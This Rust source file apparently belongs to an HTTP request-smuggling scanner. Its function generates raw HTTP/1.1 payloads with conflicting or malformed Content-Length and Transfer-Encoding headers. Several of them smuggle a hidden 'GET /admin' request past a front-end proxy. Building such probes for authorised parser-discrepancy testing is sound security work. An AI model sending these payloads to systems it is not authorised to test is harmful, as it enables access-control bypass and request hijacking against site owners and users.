use super::{format_cookies, format_custom_headers};

/// Generate Content-Length edge case payloads for parser discrepancy testing.
///
/// These payloads target edge cases in how proxies and servers parse
/// Content-Length values and handle CL/TE interactions.
pub fn get_cl_edge_case_payloads(
    path: &str,
    host: &str,
    method: &str,
    custom_headers: &[String],
    cookies: &[String],
) -> Vec<String> {
    let headers_str = format_custom_headers(custom_headers);
    let cookies_str = format_cookies(cookies);

    // Every edge case shares this request head; only the framing-header + body
    // tail varies. `push` appends one payload built from that shared prefix.
    let prefix = format!(
        "{method} {path} HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n{headers_str}{cookies_str}"
    );
    let mut payloads = Vec::with_capacity(40);
    let mut push = |tail: &str| payloads.push(format!("{prefix}{tail}"));

    // === Multiple Content-Length headers ===

    // First CL=0, second CL=6 (smuggle body past CL:0)
    push("Content-Length: 0\r\nContent-Length: 6\r\n\r\nSMUGGL");
    // First CL=6, second CL=0 (reversed order)
    push("Content-Length: 6\r\nContent-Length: 0\r\n\r\nSMUGGL");
    // Three CL headers with conflicting values
    push("Content-Length: 0\r\nContent-Length: 6\r\nContent-Length: 0\r\n\r\nSMUGGL");
    // Duplicate CL with same value but smuggled body
    push("Content-Length: 6\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG");

    // === CL value parsing edge cases ===

    // Leading zeros: 06 instead of 6
    push("Content-Length: 06\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG");
    // Leading zeros: 006
    push("Content-Length: 006\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG");
    // Plus prefix: +6
    push("Content-Length: +6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG");
    // Negative value: -1
    push("Content-Length: -1\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG");
    // Hex notation: 0x06
    push("Content-Length: 0x06\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG");
    // Decimal notation: 6.0
    push("Content-Length: 6.0\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG");
    // Scientific notation: 6e0
    push("Content-Length: 6e0\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG");
    // Null byte suffix
    push("Content-Length: 6\x00\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG");
    // Trailing space
    push("Content-Length: 6 \r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG");

    // === CL: 0 with smuggled body ===

    push(&format!(
        "Content-Length: 0\r\n\r\nGET /admin HTTP/1.1\r\nHost: {host}\r\n\r\n"
    ));
    push("Content-Length: 0\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nA\r\n0\r\n\r\n");

    // === CL with chunked body mismatch ===

    // CL says 5 bytes but body is chunked encoded
    push("Content-Length: 5\r\n\r\n1\r\nA\r\n0\r\n\r\n");
    // CL says 100 bytes but body is short chunked
    push("Content-Length: 100\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n");

    // === CL header name variations ===

    // Space before colon
    push("Content-Length : 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG");
    // Lowercase header name
    push("content-length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG");
    // Underscore variation
    push("Content_Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG");
    // No space after colon
    push("Content-Length:6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG");
    // Tab after colon
    push("Content-Length:\t6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG");

    // === Chunked body edge cases ===

    // Leading zeros in chunk size
    push("Content-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n001\r\nA\r\n0\r\n\r\n");
    // Chunk extension: ;ext=val
    push("Content-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n1;ext=val\r\nA\r\n0\r\n\r\n");
    // Multiple chunk extensions
    push("Content-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n1;a=b;c=d\r\nA\r\n0\r\n\r\n");
    // Trailers after final chunk
    push(
        "Content-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nA\r\n0\r\nTrailer: value\r\n\r\n",
    );
    // Data after final 0-chunk
    push(&format!(
        "Content-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: {host}\r\n\r\n"
    ));
    // Uppercase hex chunk size
    push("Content-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\nA\r\n0123456789\r\n0\r\n\r\n");
    // Chunk size with leading whitespace
    push("Content-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n 1\r\nA\r\n0\r\n\r\n");

    // === TE + CL ordering variations ===

    // TE first, CL second
    push("Transfer-Encoding: chunked\r\nContent-Length: 6\r\n\r\n0\r\n\r\nG");
    // CL first, TE second (standard CL.TE order)
    push("Content-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nA\r\n0\r\n\r\n");
    // TE with CL=0 and body
    push("Transfer-Encoding: chunked\r\nContent-Length: 0\r\n\r\n1\r\nA\r\n0\r\n\r\n");
    // Large CL with short chunked body
    push("Content-Length: 999\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n");

    payloads
}
